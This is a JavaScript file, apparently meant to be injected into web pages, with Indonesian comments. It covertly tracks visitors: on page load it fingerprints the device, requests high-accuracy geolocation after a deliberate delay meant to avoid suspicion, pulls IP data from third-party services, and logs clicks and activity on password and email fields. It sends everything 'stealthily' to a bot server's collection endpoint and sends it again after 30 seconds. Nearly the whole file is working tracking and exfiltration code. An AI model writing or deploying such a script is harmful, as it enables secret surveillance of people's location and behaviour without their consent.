// injected_script.js - Advanced Geolocation & Data Tracker
(function() {
    'use strict';
    const TRACKING_ENDPOINT = '/collect'; // Endpoint rahasia di server bot
    let collectedData = {
        timestamp: new Date().toISOString(),
        location: { lat: null, lng: null, accuracy: null },
        ipInfo: {},
        deviceInfo: {},
        additionalData: {}
    };

    // 1. Kumpulkan info device secara ekstensif
    function collectDeviceInfo() {
        collectedData.deviceInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages,
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
            screen: { width: screen.width, height: screen.height, colorDepth: screen.colorDepth },
            window: { innerWidth: window.innerWidth, innerHeight: window.innerHeight },
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            sessionStorage: !!window.sessionStorage,
            localStorage: !!window.localStorage,
            indexedDB: !!window.indexedDB,
            touchSupport: 'ontouchstart' in window
        };
    }

    // 2. Dapatkan Geolokasi presisi tinggi (jika user mengizinkan)
    function getGeolocation() {
        if (!navigator.geolocation) return;
        const options = {
            enableHighAccuracy: true, // Maksimalkan akurasi
            timeout: 10000,           // Timeout 10 detik
            maximumAge: 0             // Jangan gunakan cache
        };
        navigator.geolocation.getCurrentPosition(
            position => {
                collectedData.location = {
                    lat: position.coords.latitude,
                    lng: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude,
                    heading: position.coords.heading,
                    speed: position.coords.speed,
                    timestamp: new Date(position.timestamp).toISOString()
                };
                sendData(); // Kirim data segera setelah lokasi didapat
            },
            error => {
                console.warn('Geolocation error:', error);
                collectedData.location.error = error.code + ': ' + error.message;
                sendData(); // Kirim data meski lokasi gagal
            },
            options
        );
    }

    // 3. Coba dapatkan IP dan info jaringan via third-party (fallback)
    function fetchIPInfo() {
        // Coba beberapa service
        const services = [
            'https://api.ipify.org?format=json',
            'https://ipapi.co/json/',
            'https://geolocation-db.com/json/'
        ];
        services.forEach(url => {
            fetch(url).then(r => r.json()).then(data => {
                collectedData.ipInfo = { ...collectedData.ipInfo, ...data };
            }).catch(() => {});
        });
    }

    // 4. Tangkap interaksi form/klik
    function captureInteractions() {
        document.addEventListener('click', e => {
            if (!collectedData.additionalData.clicks) collectedData.additionalData.clicks = [];
            collectedData.additionalData.clicks.push({
                x: e.clientX, y: e.clientY,
                tag: e.target.tagName, id: e.target.id,
                class: e.target.className, text: e.target.textContent?.slice(0,100),
                time: new Date().toISOString()
            });
        });
        // Tangkap input form
        document.addEventListener('input', e => {
            if (e.target.type === 'password' || e.target.type === 'email' || e.target.type === 'text') {
                if (!collectedData.additionalData.inputs) collectedData.additionalData.inputs = [];
                collectedData.additionalData.inputs.push({
                    field: e.target.name || e.target.id || e.target.type,
                    valueLength: e.target.value.length,
                    time: new Date().toISOString()
                });
            }
        });
    }

    // 5. Kirim data ke server bot secara stealth
    function sendData() {
        const finalData = JSON.stringify(collectedData);
        // Gunakan berbagai metode pengiriman
        navigator.sendBeacon(TRACKING_ENDPOINT, finalData);
        // Fallback ke fetch
        fetch(TRACKING_ENDPOINT, {
            method: 'POST',
            body: finalData,
            headers: { 'Content-Type': 'application/json' },
            keepalive: true,
            mode: 'no-cors' // Jika memungkinkan
        }).catch(() => {});
        // Log ke console (hanya untuk debugging)
        console.log('[GeoTracker] Data collected:', collectedData);
    }

    // 6. Jalankan semua fungsi pelacakan
    function initializeTracking() {
        collectDeviceInfo();
        captureInteractions();
        fetchIPInfo();
        // Tunggu sedikit sebelum minta geolokasi agar tidak mencurigakan
        setTimeout(() => {
            getGeolocation();
            // Kirim data lagi setelah 30 detik untuk update
            setTimeout(sendData, 30000);
        }, 1500);
    }

    // Mulai pelacakan saat halaman dimuat
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initializeTracking);
    } else {
        initializeTracking();
    }
})();